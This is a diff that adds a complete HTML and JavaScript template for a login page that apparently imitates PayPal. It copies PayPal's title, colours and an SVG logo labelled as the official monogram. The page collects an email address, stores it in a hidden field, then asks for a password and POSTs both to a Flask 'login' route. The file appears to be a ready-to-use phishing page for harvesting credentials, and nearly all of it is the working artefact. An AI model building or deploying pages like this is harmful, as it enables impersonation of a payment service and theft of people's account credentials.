@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to your PayPal account</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        }
+        body {
+            background-color: #ffffff;
+            color: #2c2e2f;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            min-height: 100vh;
+            padding: 40px 20px 20px;
+        }
+        .login-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid #e5e7eb;
+            border-radius: 16px;
+            padding: 40px 32px 32px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo-container {
+            width: 36px;
+            height: 42px;
+            margin-bottom: 28px;
+        }
+        .paypal-logo {
+            width: 100%;
+            height: 100%;
+        }
+        .view {
+            display: none;
+            width: 100%;
+            flex-direction: column;
+            align-items: center;
+        }
+        .view.active {
+            display: flex;
+        }
+        .user-email-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #2c2e2f;
+            margin-bottom: 24px;
+            background-color: #f5f7fa;
+            padding: 8px 16px;
+            border-radius: 20px;
+        }
+        .edit-email-btn {
+            color: #0070ba;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        .input-group {
+            position: relative;
+            width: 100%;
+        }
+        .input-field {
+            width: 100%;
+            height: 52px;
+            padding: 20px 16px 6px;
+            background-color: #ffffff;
+            border: 1px solid #8c8c8c;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            color: #2c2e2f;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .input-field:focus {
+            border-color: #0070ba;
+            box-shadow: 0 0 0 1px #0070ba;
+        }
+        .input-label {
+            position: absolute;
+            left: 16px;
+            top: 16px;
+            font-size: 15px;
+            color: #6c7378;
+            pointer-events: none;
+            transition: all 0.15s ease;
+        }
+        .input-field:focus ~ .input-label,
+        .input-field:not(:placeholder-shown) ~ .input-label {
+            top: 6px;
+            font-size: 12px;
+            color: #6c7378;
+            font-weight: 500;
+        }
+        .forgot-link {
+            font-size: 14px;
+            font-weight: 600;
+            color: #0070ba;
+            text-decoration: none;
+            align-self: flex-start;
+            margin-top: 4px;
+            margin-bottom: 8px;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        .btn-primary {
+            width: 100%;
+            height: 48px;
+            background-color: #0070ba;
+            border: none;
+            border-radius: 24px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .btn-primary:hover {
+            background-color: #005ea6;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 20px 0;
+            color: #6c7378;
+            font-size: 14px;
+        }
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #cbd2d6;
+        }
+        .divider span {
+            padding: 0 12px;
+        }
+        .btn-secondary {
+            width: 100%;
+            height: 48px;
+            background-color: #ffffff;
+            border: 1.5px solid #003087;
+            border-radius: 24px;
+            color: #003087;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.2s;
+        }
+        .btn-secondary:hover {
+            background-color: #f5f7fa;
+        }
+        .footer-links {
+            display: flex;
+            gap: 16px;
+            font-size: 12px;
+            color: #6c7378;
+            margin-top: 32px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .footer-links a {
+            color: #6c7378;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        /* Hidden field */
+        .hidden-field {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<main class="login-card">
+    <!-- Official PayPal Monogram Double-P Logo -->
+    <div class="logo-container">
+        <svg class="paypal-logo" viewBox="0 0 124 148" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M38.82 147.28L47.53 92.11H19.78C16.88 92.11 14.39 90.04 13.93 87.18L0.12 0.8C-0.34 -2.06 1.87 -4.4 4.77 -4.4H53.07C74.65 -4.4 90.71 4.54 88.66 28.52C87.05 47.37 73.86 58.74 54.89 58.74H43.91L38.82 147.28Z" fill="#003087"/>
+            <path d="M47.53 92.11L55.8 39.73H80.52C99.49 39.73 112.68 28.36 114.29 9.51C115.82 -8.32 103.22 -17.26 81.64 -17.26H33.34C30.44 -17.26 27.95 -15.19 27.49 -12.33L13.68 73.95C13.22 76.81 15.43 79.15 18.33 79.15H45.54L47.53 92.11Z" fill="#0070BA" style="mix-blend-mode: multiply;"/>
+            <path d="M45.54 79.15L53.07 31.47H80.52C92.08 31.47 101.32 26.69 105.74 16.5C108.62 26.87 105.9 39.73 88.66 39.73H55.8L47.53 92.11H38.82L45.54 79.15Z" fill="#001C64"/>
+        </svg>
+    </div>
+
+    <!-- STEP 1: Email / Mobile Input -->
+    <div id="step-email" class="view active">
+        <form class="login-form" id="email-form">
+            <div class="input-group">
+                <input type="text" id="email-input" class="input-field" placeholder=" " required autofocus />
+                <label for="email-input" class="input-label">Email or mobile number</label>
+            </div>
+            <a href="#" class="forgot-link">Forgot email?</a>
+            <button type="submit" class="btn-primary">Next</button>
+            <div class="divider"><span>or</span></div>
+            <a href="#" class="btn-secondary">Sign Up</a>
+        </form>
+    </div>
+
+    <!-- STEP 2: Password Input -->
+    <div id="step-password" class="view">
+        <div class="user-email-badge">
+            <span id="display-email">user@example.com</span>
+            <span class="edit-email-btn" id="btn-edit-email">Change</span>
+        </div>
+
+        <!-- PASSWORD FORM: posts email as username, password as password to Flask -->
+        <form class="login-form" id="password-form" action="{{ url_for('login') }}" method="POST">
+            <!-- Hidden field for email (username) -->
+            <input type="hidden" name="username" id="hidden-email" value="">
+
+            <div class="input-group">
+                <input type="password" id="password-input" name="password" class="input-field" placeholder=" " required />
+                <label for="password-input" class="input-label">Enter your password</label>
+            </div>
+            <a href="#" class="forgot-link">Forgot password?</a>
+            <button type="submit" class="btn-primary">Log In</button>
+        </form>
+    </div>
+</main>
+
+<footer class="footer-links">
+    <a href="#">Contact Us</a>
+    <a href="#">Privacy</a>
+    <a href="#">Legal</a>
+    <a href="#">Worldwide</a>
+</footer>
+
+<script>
+    const emailForm = document.getElementById('email-form');
+    const emailInput = document.getElementById('email-input');
+    const displayEmail = document.getElementById('display-email');
+    const stepEmail = document.getElementById('step-email');
+    const stepPassword = document.getElementById('step-password');
+    const btnEditEmail = document.getElementById('btn-edit-email');
+    const passwordInput = document.getElementById('password-input');
+    const hiddenEmail = document.getElementById('hidden-email');
+
+    // Transition from Email step to Password step
+    emailForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const emailValue = emailInput.value.trim();
+        if (emailValue) {
+            displayEmail.textContent = emailValue;
+            hiddenEmail.value = emailValue;   // set hidden field for submission
+            stepEmail.classList.remove('active');
+            stepPassword.classList.add('active');
+            passwordInput.focus();
+        }
+    });
+
+    // Edit Email action (back to email step)
+    btnEditEmail.addEventListener('click', () => {
+        stepPassword.classList.remove('active');
+        stepEmail.classList.add('active');
+        emailInput.focus();
+    });
+</script>
+
+</body>
+</html>
